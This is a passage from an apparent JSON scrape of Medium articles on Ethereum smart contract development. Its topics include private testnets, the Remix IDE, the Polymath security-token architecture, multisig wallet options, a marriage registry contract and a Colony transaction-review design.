enable mining on your nodes, otherwise any contracts your deploy or Ethereum you exchange will stay in a pending state.# In geth console> miner.start(0)> miner.stop()Deploy your smart contract on your private testnetNow that we have our own private testnet setup. We can compile our smart contract and deploy to it. With the geth console running, navigate to your smart contract project directory. First, check the <smart contract project dir>/truffle.js file to make sure you have an environment configured pointing to your private testnet and then compile and deploy with truffletruffle compiletruffle migrate --network myPrivateTestNetThat it! You now have a private testnet setup to test your smart contracts.FinallyGive us a \ud83d\udc4f\ud83d\udc4f\ud83d\udc4f if you enjoyed this post it will motivate us to put out more great content.You made it to the end! You\u2019re awesome! We should hang out more often! To learn how to build great app and dApps, follow BCG Digital Ventures Engineering, BCG Digital Ventures and the author of this post, Ali Muzaffar.", "responses": 0, "tags": ["Ethereum", "Smart Contracts", "Solidity", "Development", "Testrpc"]}, {"title": "Blockchains for Babies", "post_link": "https://medium.com/blockchannel/blockchains-for-babies-595976eeb2bb?source=search_post", "author_name": "BlockChannel", "author_link": "https://medium.com/@BlockChannel", "publish_date": "2018-07-23", "last_modified_date": "2018-07-23", "readtime": "2.25", "claps": 395, "voters": 30, "content": "Blockchains for BabiesBlocks, They\u2019re Not Just for Babies Anymore.BlockChannelFollowJul 23, 2018 \u00b7 3 min readCross-Post: This post was originally written by Layne Haber, and was republished from the Connext blog with their explicit permission.Wait, what?As we\u2019ve been preparing for the launch of the Connext Pilot Program, we\u2019ve spoken at length with companies native and non-native to the Ethereum community. That experience has led us to the conclusion that complicated technical explanations are sometimes helpful, but more often they leave everyone (ourselves included) lost in the esoterica.Inspired by our favorite children\u2019s books, we\u2019re proud to present Blockchains for Babies, the first in a series that will later touch on state channels, plasma, and eventually sharding.Now, without further ado, we present:", "responses": 0, "tags": ["Blockchain", "Ethereum", "Solidity", "Education", "State Channels"]}, {"title": "Remix IDE 0.6.3 Release", "post_link": "https://medium.com/remix-ide/remix-new-release-dcd5673e6777?source=search_post", "author_name": "Nina Breznik", "author_link": "https://medium.com/@ninabreznik", "publish_date": "2018-05-15", "last_modified_date": "2018-06-14", "readtime": "2.97", "claps": 72, "voters": 27, "content": "Remix IDE 0.6.3 ReleaseNina BreznikFollowMay 15, 2018 \u00b7 3 min readOn May 8th 2018 we released a new version of Remix-IDE. What has changed in this release?1. We switched encoding /decoding of input parameters, output parameters and events parameters in Remix to ethers.js.Before switching to ethers.js we were using etheremjs-abi. This caused some changes to what formats are accepted as function inputs in autogenerated UI part in Remix e.g. what formats are accepted as function inputs in autogenerated UI part in Remix:The type bytes now requires an hexadecimal stringThe type address now requires to be filled (not possible anymore to keep the field blank by mistake)Decoded events in logs are also displayed in a slightly different way2. Publishing to a gist now requires authenticationGist API has recently changed and it unfortunately requires users to be authenticated to be able to publish a gist.Under https://github.com/settings/tokens select Generate new token.Then check only Create gists checkbox and generate a new token.Then paste it in Remix (right panel/Settings tab) and click SaveNow you can use these Github icons (top left corner) and store your files as Github gists.3. UX improvement: TerminalWhile waiting for transaction to be mined, you can now follow the transaction on Etherscan.Details button was removed. To see additional information about a transaction, click on the caret to the left of the log to expand/collapse the details.4. UX improvement: Run tabWhen you have multiple parameters in a function, previously you had to put the parameters in a comma separated list. Now, if you click the caret to the right of the input field, each parameter gets its own input field. Scroll down to see example for addProposal function.5. PluginsWe are also working on improving how Remix can be used by and with external tools and applications. You will soon be able to create custom plugins and connect them to Remix in order to get extra features you might need (e.g. linting, static analysis, transaction analysis, testing).A first Plugin API will likely be released within two months.Currently the plugin feature is in the test phase (first stable version of plugin API is expected in the next two months). If you are interested in plugins and would like to try out our alpha API, please reach out to us in the https://gitter.im/ethereum/remix-dev-plugin.We have also released embark-remix which allows users to spawn an instance of Remix IDE on their local computer and interact with their Embark project. Documentation/readme about this feature coming soon.6. Other improvements and fixesWe were also working on:Setting up Best PracticesPlugin API message specificationEmbark-remix pluginRefactor app.jsRefactor tabsReadme cleaning upBug Fix: sync issues with remixdBug Fix: account loading when switching provider #1252The Remix team members, working on this release: Alex \u3010\u30c4\u3011, iuri matias, Rob Stupay, Yann Levreau and myself.", "responses": 3, "tags": ["Blockchain", "Ethereum", "Remix Ide", "Solidity"]}, {"title": "Exploring the Polymath Core Architecture", "post_link": "https://blog.polymath.network/exploring-the-polymath-core-architecture-15c7b658bd5b?source=search_post", "author_name": "Pablo Ruiz", "author_link": "https://blog.polymath.network/@pabloruiz55", "publish_date": "2018-04-19", "last_modified_date": "2018-08-22", "readtime": "6.74", "claps": 379, "voters": 28, "content": "Exploring the Polymath Core ArchitecturePablo RuizFollowApr 19, 2018 \u00b7 7 min readWith the release of Polymath Core \u201cToro\u201d, we re-engineered Polymath\u2019s complete smart contract suite to make it easier to issue regulatory-compliant Securities Tokens on the Ethereum blockchain.In last week\u2019s article we went over the ST-20 interface and briefly touched on the new architecture of the Polymath Core contracts. In this article we are going to learn what the Polymath Core ecosystem looks like and how we approached smart contract modularity to make Security Tokens easy to deploy as well as upgrade.The Polymath Network ArchitectureBefore we get started, let\u2019s quickly do a recap of the ST-20 interface. The ST-20 token is an ERC-20 compliant token that adds one fundamental method, verifyTransfer which must be implemented on the transfer and transferFrom methods to determine if a transaction should be allowed or not.Our own implementation of this interface is called SecurityToken, which follows a modular approach. The SecurityToken contract gets a series of modules attached to it by default in order to define its behavior. Issuers may attach their own \u2014 or other\u2019s\u2014 creations to comply with their business requirements.Before we go into details with regard to how modules work, let\u2019s explore what the complete Polymath landscape looks like:The Polymath RegistriesThe Polymath Network is comprised of several interconnecting pieces that make it easy for us to \u201cupgrade\u201d the Security Token contract and add incremental features as the platform evolves. With Polymath, Security Tokens and their available modules are managed by a set of registries:Ticker Registry: One design decision we made early on was giving issuers the ability to reserve token symbols. On the Polymath platform, token symbols are unique; no two securities tokens may have the same symbol. Tokens are, of course, still uniquely identifiable by their contract address on the Ethereum network, but they can also be identified by their token symbol. There are obvious upsides and downsides to this approach. On one hand, this prevents malicious actors from deploying tokens with the same token symbol as popular companies, expecting to scam inadvertent users. On the other hand, symbol \u201csquatting\u201d could be a problem as the platform gains widespread adoption and people want to secure token symbols for themselves. In any case, the Ticker Registry serves the purpose of managing token symbol \u201creservations\u201d and only allowing tokens with unique tickers to be created.Security Token Registry: The Security Token Registry keeps a record of all tokens issued on the Polymath platform and manages what version of the SecurityToken will be used by the issuance platform. The Security Token Registry uses a token proxy mechanism that allows us to upgrade the Security Token and have the Registry deploy these new token versions as we release them. Notice that existing ST-20 tokens will not be upgraded when there\u2019s a protocol upgrade, but rather, they are self-contained and unaffected by any changes made to the platform as a whole.Module Registry: The Module Registry is one of the most interesting aspects of the Polymath platform and it is what gives the platform its flexibility. As mentioned before, the SecurityToken smart contract is a base implementation of the ST-20 interface which allows for these so-called modules to be attached to it. The Module Registry acts as a repository of \u201cblueprints\u201d for these user-submitted modules that can be mixed-and-matched to specific tokens. At Polymath, we have developed a few modules that grant Security Token contracts with base functionality, and we expect and encourage the developer community to submit their own creations.Exploring SecurityToken\u2019s ModularityThe SecurityToken smart contract has been designed to support a wide range of modules with different functionalities. These modules work like add-ons to the token which can be added, upgraded or removed depending on the needs of the issuer. Modules are grouped into categories, and depending on the category, multiple modules may be present that could be replaceable or non-replaceable. For our Toro release, we have made the following module types available: Transfer modules, Permission modules, and Security Token Offering (STO) modules.Transfer Modules: Transfer Modules control the logic behind transfer restrictions. Once the initial offering has been launched, the Transfer modules are in charge of controlling who can and cannot buy or sell tokens according to their own internal logic. With Toro, we have released 2 Transfer modules:General Transfer Manager Module: This is a general-approach whitelist-based Transfer module. This module holds a list of verified investors and their sale/purchase restrictions. When a transfer is attempted, this module will check if the addresses are present on the whitelist and it will allow or disallow the transaction.Exchange Transfer Manager Module: This module has been created specifically for dealing with centralized exchanges. By using this module, the issuer may grant a particular exchange with permissions to add their own KYC verified users to a separate whitelist. An in-depth explanation of how these transfer managers work is outside the scope of this article.Permission Modules: Permission modules give the issuer the ability to grant other accounts permissions to certain operations within their issuance process. For example, by using the default Permission Manager module, the issuer might give a person they trust the ability to manage their whitelisting process; or they might use it to give an external smart contracts developer the ability to set up their STO contract.Security Token Offering Module: These modules control the logic behind the token\u2019s initial issuance/sale. A Security Token may assign one, and only one, STO during its life-cycle and this module, once attached and configured, may not be replaced. We\u2019ll go over how the STOs work in a future article, but for now, it\u2019s important to know that these modules are the equivalent to the ICO\u2019s Crowdsale contracts. They control the logic under which tokens are distributed/sold and there are infinitely many ways they can go about this. For the Toro release, we included a Capped STO which allows the issuer to sell their tokens under the following logic:Raise in POLY or ETH: The Capped STO allows the issuer to select if they want to do the raise completely in POLY or completely in ETH.Start and End dates: The capped offering has a start date and an end date. Tokens may only be acquired during that period.Hard cap: There\u2019s a maximum amount of tokens that can be sold during the offering. No more contributions may be received if all tokens have been sold. Tokens are only minted after each purchase, so if the cap is not reached, the remaining unsold tokens will simply not be created.Exchange Rate: The exchange rate between ETH/POLY and the token being sold can be set before the offering starts and determines how many of the tokens can be purchased with 1 ETH/POLY.So, How Do All These Pieces Fit Together?Let\u2019s do a recap of all we\u2019ve gone over this article:Polymath network has Ticker and Security Token registries which are in charge of keeping track of tickers that have already been registered and which ones are still available for issuers to claim.Then, there\u2019s the Module Registry which keeps track of all the module factories or \u201cblueprints\u201d that can be generated and attached to Security Tokens.Finally, upon creation, the SecurityToken contract will get some of these modules attached by default (like the Permission Manager and the General Transfer Manager modules) and other modules may be attached during the issuance process (like the Capped STO module).Once the SecurityToken has its selected STO module configured and attached, the issuance will begin and investors will be able to acquire tokens according to the internal logic of the offering contract.Over time, more modules might be added to the Security Token and some of its modules might even be replaced.A Final Note on UpgradeabilityOne important thing to note is that the SecurityToken contracts themselves are not upgradeable per se. Once a SecurityToken contract has been deployed it is not possible for it to implement new features that Polymath launches over time. Some modules (when allowed) may be replaced by new ones, but in general terms, a token launched on Polymath should be considered final and not upgradeable.When we talk about upgradeability, we refer to upgradeability of the protocol in general, which allows the Polymath team to release new features for SecurityToken v2, v3 and so on. These changes will never affect existing tokens that exist out in the open, for better or for worse.For example, if we hypothetically released a new feature that adds SecurityToken contracts the ability to distribute dividends, that would require upgrading the Polymath protocol. This means that when a new token was to be deployed by the Security Token Registry, instead of deploying the original version of the token we have right now, the upgraded version would be deployed instead. Thus, tokens issued from then on would have this brand new feature, but the old ones would not. None of these changes would affect existing tokens that were issued using Polymath.Where to go next?In the coming weeks we\u2019ll continue releasing articles that further explain how our protocol works, how you can use it to issue a security token, how you can build on the protocol, and much more. Stay tuned!Exploring Polymath CoreAre you a developer interested in how securities tokens work? Take a look at our Github repo and feel free to ask any questions and submit any issues you find.Joining PolymathAre you interested in joining the security token revolution? We are always looking for high quality talent. Check out our careers page at https://polymath.bamboohr.com/jobs/ to apply!About PolymathPolymath Network (Polymath) is a decentralized platform that makes it easy to create security tokens. The Polymath ST-20 standard embeds regulatory requirements into the tokens themselves, restricting trading to verified participants only. The platform simplifies the complex technical challenges of creating a security token and aims to bring the multi-trillion dollar financial securities market to the blockchain.", "responses": 3, "tags": ["Blockchain", "Ethereum", "Developer", "Solidity", "Tech Blog"]}, {"title": "List of MultiSig Wallet Smart contracts on Ethereum", "post_link": "https://medium.com/@yenthanh/list-of-multisig-wallet-smart-contracts-on-ethereum-3824d528b95e?source=search_post", "author_name": "L\u00ea Y\u00ean Thanh", "author_link": "https://medium.com/@yenthanh", "publish_date": "2018-06-02", "last_modified_date": "2019-04-03", "readtime": "3.63", "claps": 239, "voters": 27, "content": "List of MultiSig Wallet Smart contracts on EthereumL\u00ea Y\u00ean ThanhFollowJun 2, 2018 \u00b7 4 min readIn this post, we are going to overview some verified implementations for MultiSig Wallet Smart contracts on Ethereum that you can use for your business.TL;DRI asume that you already have some basic knowledge about Ethereum and Smart contracts. If not you can start to learn here.If you don\u2019t know what is Multisig wallet, you can learn more about it here. Basically, it is a smart contract that implemented as a wallet to store your ETHER / Tokens where belonged to multiple owners, a transaction issued needs to be accepted by at least <requirements> (this number can be customized) owners to be proceededList of MultiSig Wallet Smart contractsHere I will list some implementation for MultiSig Wallet that are verified and widely used. Please keep in mind that you shouldn\u2019t change the implementation as the code is tested carefully to prevent any problem unless you really know what you are doing. Of course I can not guarantee that those smart contracts are 100% bug free as it is made by human anyway :) So always test everything carefully before deploy it to the mainnet.And here is the list:ConsenSys\u2019 Multisig Wallet \u2014 This is one of the simplest implementation for the Multisig Wallet, the code is easy to understand and use, basically you can use the multisig wallet to do anything an individual account can do (except deploying contract, of course!). It is widely used and one of the biggest wallet deployment has 200k ETHER! (reviewed on the time writing this post). Its drawback is lacking of test and not updated for a long time, the code still use solidity ver 0.4.10!Gnosis\u2019 Multisig Wallet \u2014 This is an upgrade implementation for the ConsenSys\u2019 Multisig Wallet. The wallet still maintain the simple logic and code as its a.The code is structured as a Truffle project with tests and active developments, this is a good alternative choice if you don\u2019t want to use the Wallet from ConsenSys.BitGo\u2019s Multisig Wallet \u2014 This implementation is also a good choice. The project is implemented with Truffle, tested with an active community. The wallet has more complex logic than the Gnosis\u2019s and ConsenSys\u2019s but still easy for you to understand and logic. One of the biggest advantage of this wallet is ERC20-Token Compatibility, owner can use defined function to transfer Token easier than the other wallets (yes, of course we can use other wallet to transfer token or do any advanced stuffs). Notice that this Multisig Wallet is implemented using 2-of-3 signing configuration, meaning the wallet has exactly 3 owners and require 2 agreements to proceed the transaction.Ethereum Dapp\u2019s Multisig Wallet (Sourcecode on Etherscan) \u2014 If you use Ethereum Wallet or Mist, you can see that the App also provide you a method to deploy a Multisign Wallet. The interesting part is this wallet is compatible with the Ethereum Wallet App and Mist App, which means you can call the function send transaction or confirm easily. Although there are no documents about how to use this wallet, we can analyze its implementation here (a little bit different from the one committed on ethereum\u2019s repo) and understand the logic clearly. There are some function has a special implementation that requires tricky way to proceed, such as \u2018changeRequirements\u2019 needs to be call by many owners and mined in the same block to be proceeded.Parity\u2019s Multisig Wallet (NOT RECOMMENDED)\u2014 Parity UI App also has a similar feature as Ethereum Wallet which helps us deploying the Multisign Wallet easily. Sad news is in Nov 6th, 2017 the parity\u2019s multisig wallet is hacked which make $300mil frozen forever, the problem is because of all the deployed multisign wallet use a library implemented by Parity which isn\u2019t initialized correctly. A person luckily become the owner of the library because of this bug and try to stole the money by calling the \u2018kill\u2019 function, he couldn\u2019t get the money but make all smart contracts used this library died. That\u2019s why all the implementation for Multisig Wallet I listed here has no library dependencies in the code to prevent this scenario happen again. I don\u2019t know if the Parity has changed the way they deploy the smart contracts for MultiSig Wallet or not but I would not recommend people to use the Parity to generate the Multisig Wallet now (anyway, Parity is still a good choice for Ethereum Node now).What Multisign Wallet I should use?Well, I leave the answer for you. You can also implement your own Multisig Wallet if you really good at Solidity and have enough confidence. In any case, you need to test and read the smart contracts to understand the implementation carefully before deploying things to the mainnetIn TALO we use the Gnosis\u2019 MultiSig Wallet because of its simplicity and well development, the implementation is good enough for us to use in many cases. If you want to know more about TALO, you can take a look at: https://talo.io.Subscribe for TALO to learn more about us and intersting articles:Blog: https://medium.com/talo-protocolTelegram: https://t.me/taloioFacebook: https://www.facebook.com/talo.ioTwitter: https://twitter.com/talo_protocoltalo.io", "responses": 3, "tags": ["Ethereum", "Multisig Wallet", "Solidity", "Talo", "Talo Protocol"]}, {"title": "ETHERBOTS: Game Contract and Team Published", "post_link": "https://medium.com/@immutable/etherbots-game-contract-and-team-published-10c979bbd549?source=search_post", "author_name": "Immutable", "author_link": "https://medium.com/@immutable", "publish_date": "2018-02-02", "last_modified_date": "2018-05-27", "readtime": "3.34", "claps": 388, "voters": 27, "content": "ETHERBOTS: Game Contract and Team PublishedImmutableFollowFeb 2, 2018 \u00b7 4 min readCan you spot the frying pan?Psst! Never heard of us? Head over to our introductory article first.We have some huge announcements that we\u2019re very excited to make!Announcement 1: Contract Code PublishedOur team has pushed source code of our smart contract up to github, available here! It\u2019s descriptively typed and well-commented, and we\u2019re also releasing a game guide to help walk you through it. We\u2019ve based the battle functionality off a commit reveal scheme, that takes into account meaningful choices made by the players. You can ready your Robot for battle by submitting (\u201ccommitting\u201d) a series of moves you want it to make against potential attackers. These moves are stored secretly on the blockchain, so the attacker has no advantage. If you\u2019re attacked, the attacker will also submit a series of moves. You then reveal your moves, the game initiates the battle, and the winner is rewarded with experience and loot (item shards, or if you\u2019re extremely lucky \u2014 a part). (Don\u2019t worry; we handle all the hard cryptographic stuff on our end. All you see is a pretty game.)The contract is still in beta, and you\u2019ll see us updating parts of it over the next few days. We\u2019ve published it early to not only show off some of the sweet functionality, but so that people can feel assured about the state of the game as they watch the final parts of development happen.We will also be announcing our feature bounty and bug bounty programs in a few days. The feature bounty is to improve any gameplay mechanics or balancing issues, and the bug bounty is for security. We\u2019ve already put in extensive work into making the contract as safe as possible, and the safety of user\u2019s parts are greatly benefited by our ERC721 token implementation for robot parts. We just want to make sure our Etherbots are well oiled and galvanized before they enter the battlefield.What are some of the things you\u2019ll see in our contract?Etherbot parts as tradeable, ownable, non-fungible tokens, implementing best practices.A suite of security features and best practices adopted including standard contract pause functionality.A novel way to create new types of battles while never restricting access to old styles. (In short: storing an immutable array of contract addresses which we can push to, but never remove from. If you don\u2019t like any new implementations \u2014 simply hop back to an earlier game type!)Announcement 2: The Team behind the ScenesThe feedback we\u2019ve received has been phenomenal so far.\u201cThe captions are witty, the graphics are polished, the team is responsive and open to suggestions.\u201d (source)However, many of our fans wanted to know who we were (and our skeptics demanded it). Well, the full team page has been published. You can see our *beautiful* faces on our corporate site, and check out what we\u2019ve been up to on our githubs.We\u2019re a team of blockchain enthusiasts from a range of development (and design) backgrounds. We\u2019ve covered everything from working to improve the Lightning network, creating decentralized Ethereum applications and developing world class enterprise code and designs for leading corporations.What have we done in the past?Leading a front end Development Team at a 9-figure Annual Revenue CorporationSoftware Engineering at UberAnimation work for Ubisoft\u2019s Assassin\u2019s Creed: OriginsAnd in our spare time, working to improve the Lightning Network and extensive solidity and security architecture development(small) Announcement 3: New Robot CrateIt\u2019s sooo pretty. Think of all that pride and accomplishment.Apart from coding, we\u2019ve been working tirelessly on designs and animations for the battle functionality (our animator\u2019s past projects include things like Assassin\u2019s Creed: Origins) to make Etherbots truly gorgeous. We aim for the highest quality in everything we do.You can buy this crate in presale, and we\u2019re also using it for how you\u2019ll receive shards or parts if you\u2019re victorious in a battle.Announcement 4: Secret (and huge). Coming soon. ;)We have some very exciting news to share, but we\u2019re finalising the details (and don\u2019t want to spill everything all at once!) Stay tuned over the next week.As always, we love hearing from our users. If you got a sweet gold part from a crate, think that the frying pan should be nerfed (or Irelia\u2026), or have fantastic idea for a free-for-all deathmatch in the Etherbot equivalent of a Rust map: tell us all about it on discord, twitter, or reddit.Welcome to the arena.", "responses": 4, "tags": ["Ethereum", "Cryptocurrency", "Games", "Solidity", "Cryptokitties"]}, {"title": "How to Deploy a Smart Contract in 5 Minutes", "post_link": "https://medium.com/gochain/how-to-deploy-a-smart-contract-in-5-minutes-bed2443be23c?source=search_post", "author_name": "Travis Reeder", "author_link": "https://medium.com/@treeder", "publish_date": "2018-08-16", "last_modified_date": "2019-02-07", "readtime": "1.78", "claps": 739, "voters": 27, "content": "How to Deploy a Smart Contract in 5 MinutesTravis ReederFollowAug 16, 2018 \u00b7 2 min readUPDATE FEB 7, 2019: Want to do it in 3 minutes? Check out the new web3 tool that makes all of this WAY easier: https://github.com/gochain-io/web3Creating and deploying Ethereum based smart contracts has never been a simple task. Typically requiring you to use some complicated framework, run a local node and/or develop in a barely usable online editor. Today I\u2019ll show how easy it is to deploy a contract to GoChain.PrerequisitesYou will need a few things before we get started:Install Visual Studio Code (you should already be using this if you\u2019re a developer anyways)Install the VS Code Solidity extensionGet some GO \u2014 Ask for some free testnet GO in our Testnet Telegram or buy some on KuCoin to deploy to mainnetCompile your ContractLet\u2019s take the simple token code from the Ethereum website, it looks like this:Copy that code and paste it into a new file called mytoken.sol in VS CodePress F5 to compileThis will create a few files in a bin/ directory, open MyToken.bin . This contains your contract bytecode, which you\u2019ll use below.Now you have the bytecode for your contract, let\u2019s deploy it!Deploy your ContractThis is really easy using the GoChain Wallet:Go to https://wallet.gochain.io/In the top right, choose TestNetClick Open WalletPaste your private key for your testnet wallet that has the GO you got from our TelegramClick Deploy ContractCopy the contents of MyToken.bin into the Bytecode fieldClick Send!After a few seconds your contract will be deployed and you\u2019ll get a contract address, copy the address and save it somewhere. That address is what people will use to interact with your contract.Next StepsAfter you\u2019ve deployed your contract, you\u2019ll want to use it. There are many ways people can interact with your contracts, whether it\u2019s sending GO directly to it, using the GoChain Wallet, using MyEtherWallet, or using a DApp that uses it. We won\u2019t go into that in this post as we could write several other posts on that part and it depends on what your contract does.We know it can be intimidating to know where to start when you first get into developing smart contracts, I hope this post helps you see how easy it can be.More documentation at: https://github.com/gochain-io/docsLearn more about GoChain at https://gochain.ioJoin our Telegram GroupFollow us on Social!TwitterMediumRedditCrunchbaseInstagramFacebookBitcoin Talk", "responses": 0, "tags": ["Ethereum", "Gochain", "Smart Contracts", "Solidity", "Blockchain"]}, {"title": "Hey Baby, I Think I Wanna Marry You (On the Blockchain) \ud83d\udc92", "post_link": "https://medium.com/hackernoon/hey-baby-i-think-i-wanna-marry-you-on-the-blockchain-3227ba3bdfe?source=search_post", "author_name": "Pablo Ruiz", "author_link": "https://medium.com/@pabloruiz55", "publish_date": "2017-11-08", "last_modified_date": "2019-05-13", "readtime": "5.94", "claps": 90, "voters": 26, "content": "Photo by One Wedding on UnsplashHey Baby, I Think I Wanna Marry You (On the Blockchain) \ud83d\udc92Pablo RuizFollowNov 8, 2017 \u00b7 6 min readThe concept of matrimony has existed for tens of thousands of years, but only a few hundred years ago they started involving actual contracts or even a ceremony. As a matter of fact, even though the Bible features lots of married people, there are no descriptions of ceremonies According to this article:The only \u201cceremony\u201d I can find in the Bible is Tobit 7:12\u201314 in which a father places the hand of his daughter in the hand of the husband, and then writes a contract.[\u2026] No vows, no priest, no ritual, no prayer, no pronouncement, no license, no registration.Of course, this has changed in the past hundreds of years. Today, for a marriage to be considered legal it has to be recognized by the State. Each culture, religion, country and state also have their own rules to determine what constitutes a valid marriage. Fro example there are some places where same-sex marriages are permitted and others places where they are not, child marriages and cousin marriages are permitted in some countries or cultures, some countries allow for men to marry more than one woman, etc, etc.How the ceremonies are performed also vary from place to place. For example, some states and countries require the presence of witnesses during the ceremony. According to what I could find around online, they were mostly required to ensure that neither spouse has been forced into the wedding. Today, they are chosen for being close friends or relatives whom the couple wants to share that special moment with.Getting Married on the BlockchainIn this article, I intend to approach how a marriage contract could look like on the Blockchain. For this particular contract, I\u2019ve removed the need of witnesses and made the matrimony process as simple as possible, but without leaving out the possibility of having several authorities or registries that define their own rules for officiating marriages.The marriage process is structured as follows:There is a Marriage Registry that keeps a record of all the marriage proposals and officiated marriages. If someone wants to get married to someone else, all they have to do is to issue a request to the registry, which will verify that both spouses can actually get married.Being able to get married just means, in the context of this registry, making sure that each person has not already married someone else. There could be other registries with different set of rules given that, as I mentioned before, marriage rules vary from place to place.For example, there could be a Marriage Registry that requires both spouses to be over 18 years old; or both of them to be from the same country or even allow a person to be married to more than one person.Or even allow people to marry their cousins.The other component is the Marriage contract which holds the information of the marriage such as the addresses of the spouses; the status of the matrimony; the date the ceremony was performed, and it is also the main point of contact for the interaction between spouses, such as accepting one another\u2019s proposal or filing for a divorce.It\u2019s worth mentioning too that the MarriageRegistry contains a few functions that allow an external party to obtain information about a people from it. Anyone can query the registry for the following information:Given any of the spouses, anyone can retrieve the Marriage contract that bonded them.Given a Marriage contract address, anyone can get he \u201cMarriage Certificate\u201d containing the address of both spouses and the date they married.Given one of the spouses, anyone can find out who they are married to.Given two spouses, anyone can find out if they are married or not.Given one of the spouses, anyone can find out if that person is married or not.These functions are meant to be used, mainly, by other entities that care about a person being married or single for their own processes and procedures. For example, a bank could query this registry to obtain information about the marital status of a couple asking for a joint mortgage.How to use the contracts:The MarriageRegistry contract has been deployed in Ropsten testnet and verified through Etherscan at address: 0x57f38682c5E802f78cCC71B2D2932230b1C41c47You can find the source code for the two contracts involved (Marriage.sol and MarriageRegistry.sol) on my Github Repository.You can use them to marry someone like this:1-\ud83d\udc8d Propose marriage to someone: Marriage contracts can only be generated by the MarriageRegistry contract, so, if you want to propose to someone, all you have to do to initiate the process is calling the proposeMarriage() function on MarriageRegistry and specify the address of the person you are proposing to.2- \ud83c\udf39 Have your significant other accept or reject the proposal: The person being proposed marriage now has the option to either reject or accept the proposal. If they reject the proposal by calling rejectProposal() on the newly created Marriage contract, the marriage is off and the contract is destroyed. On the other hand, if they call acceptProposal() then it\u2019s official, you are married! When you called proposeMarriage() it generated a new Marriage contract tying both you and the recipient of the proposal. You have to share the address of that contract with the other person for them to act upon it. You can either find it on Etherscan.com or call getMarriageContract() on MarriageRegistry by passing either address as parameter.3- \ud83d\udcd9 Get your marriage certificate: You (or anyone) can query the MarriageRegistry to get the marriage certificate stating the address of both spouses as well as the marriage date. To get the marriage certificate just call getMarriageCertificate() and pass the marriage contract address as parameter.4-\ud83d\udc94 Getting divorced: Sometimes married life is not as we thought it would be and the couple feels it is best to get divorced. For situations like this, we have the requestDivorce() function. As with the marriage proposal, both spouses have to agree on this in order for the divorce to be performed. Once both parties call this function, the contract will be destroyed and they will be free to marry someone else. (Or to stay single \ud83c\udf8a)Where to go from here?First of all, if you used these contracts to get married, congratulations! Good luck getting some days off at work with the certificate this registry issues, though. \ud83d\ude1eWhen you are back from your honeymoon \ud83c\udfd6, we can discuss a few improvements that could be made to these contracts, for example:Even though I mentioned the possibility of extending the Marriage Registry and creating other registries with different sets of rules, there\u2019s a problem with this approach. If there are several registries, there\u2019s currently no central registry that keeps track of marriages across these registries. So, if I got married in registry A, registry B would not know about it and I could also get married in registry B if I wanted so. One solution could be to have a central registry \u2014 a registry of registries \u2014 that keeps track of all registries provides a way for registries to ask each other for information.The current implementation accepts divorces so, if both spouses agree, they get immediately divorced by eliminating the Marriage contract (calling self-destruct) and an event is fired in the MarriageRegistry to log the divorce. For the divorce to happen both parties have to agree, which not always happens. Right now we are not considering the case where one of the parties requests the divorce, but the other refuses to sign. What should be done in these cases?Additionally, I am not contemplating, for example, the death of one of the spouses. If one of them were to pass away, or be incapacitated, there\u2019s no way for a divorce to happen since it requires the agreement of both parties.Anyone can query the registry to get the marital status of any given person (as long as they know their address or the marriage contract\u2019s address), this is great as long as this information is used with good intentions, but it also opens the possibility of someone using this information to damage one or both of the spouses. We should probably restrict access to this information and only make it available if one of the spouses authorizes so.You can get married to a smart car, a token crowdsale, a multisig wallet or whatever, sort of.The contract doesn\u2019t perform any checks to make sure either spouse is an Externally Owned Account. So, another contract could be provided as parameter and if that contract implements the necessary functions to accept the proposal, then there\u2019s a marriage. As a matter of fact, a married couple could marry another married couple, if they wanted so (and built such a contract). \ud83d\udc6b \ud83d\udc6b https://www.youtube.com/watch?v=t_jHrUE5IOk", "responses": 2, "tags": ["Ethereum", "Solidity", "Blockchain", "Smart Contracts", "Development"]}, {"title": "Parameterized Transaction Reviews", "post_link": "https://medium.com/colony/parameterized-transaction-reviews-11f0cdc40479?source=search_post", "author_name": "Elena Dimitrova", "author_link": "https://medium.com/@elena_di", "publish_date": "2018-09-20", "last_modified_date": "2018-09-20", "readtime": "6.95", "claps": 582, "voters": 27, "content": "Parameterized Transaction ReviewsFor when a multi-sig is just not granular enough for your transaction review needsElena DimitrovaFollowSep 20, 2018 \u00b7 7 min readIt\u2019s like that game \u201cOperation\u201d, but for bytecode!Multi-signature transactions are one of the most useful patterns for smart contracts and the dApps that utilize them. But in the \u2018vanilla\u2019 implementation of multi-signature design, transaction reviewers (owners), are assigned contract-wide and review all transactions. Colony\u2019s requirements for multi-sig transactions are more complex than this provides. We have multiple user roles within a Colony, and depending on context, which signatures are required for various operations may differ.For example, one of the base building blocks in Colony is the Task. A task is a small unit of work to be done for an organization, and it has three distinct roles defined to coordinate that work: a manager, an evaluator and a worker.There are many tasks within each colony and each can have a different set of users assigned to these three roles for each task. We want the flexibility to have any combination of two of the three task roles to be configurable as reviewers on a particular task change type as shown in the example set of four Taskchange functions below.+------------------------+-----------------+-----------------+|      Function          | Reviewer Role 1 | Reviewer Role 2 |+------------------------+-----------------+-----------------+| setTaskBrief           | manager         | worker          || setTaskDueDate         | manager         | worker          || setTaskEvaluatorPayout | manager         | evaluator       || setTaskWorkerPayout    | manager         | worker          |+------------------------+-----------------+-----------------+If a task manager decides to change some of its properties, such as to change the work brief (specification) hash, this change should also be reviewed by the worker, who will have to adjust to the new terms in order to claim a payout and reputation gain. In another case, if a manager wants to change the evaluator\u2019s payout, the change should be approved by the evaluator rather than the worker.Additionally we don\u2019t want to have each role sign and submit a transaction to the blockchain individually \u2014 this will cost too much gas to be manageable in the long term. The change should instead be agreed upon in advance, and then committed to the blockchain only once with the required signatures.To achieve all this, we created the parameterized transaction review design pattern, and implemented it within Colony tasks.Our implementation builds upon the ideas insimple-multisigdesign by Christian Lundkvist, where transaction data is submitted and only executed once (on chain) after all required signatures are received (off chain).Let\u2019s get into the details of how this all works!Constructing the task change transaction dataWe\u2019ll refer to a simplified version of the Colony Task data structure and a set of update functions to demonstrate the design.struct Task {    bytes32 specificationHash;    uint256 dueDate;    // Role Ids mapping to user addresses, using role Ids:    // 0 - task manager, 1 - task evaluator, 2 - task worker    mapping (uint8 => address) roles;    // Maps task role ids (0,1,2) to payment amount    mapping (uint8 => uint256) payouts;}  mapping (uint256 => Task) tasks;uint256 taskCount;uint8 constant MANAGER = 0;uint8 constant EVALUATOR = 1;uint8 constant WORKER = 2;function setTaskBrief(uint256 _id, bytes32 _specificationHash) public {    tasks[_id].specificationHash = _specificationHash;}  function setTaskDueDate(uint256 _id, uint256 _dueDate) public {    tasks[_id].dueDate = _dueDate;}  function setTaskEvaluatorPayout(uint256 _id, uint256 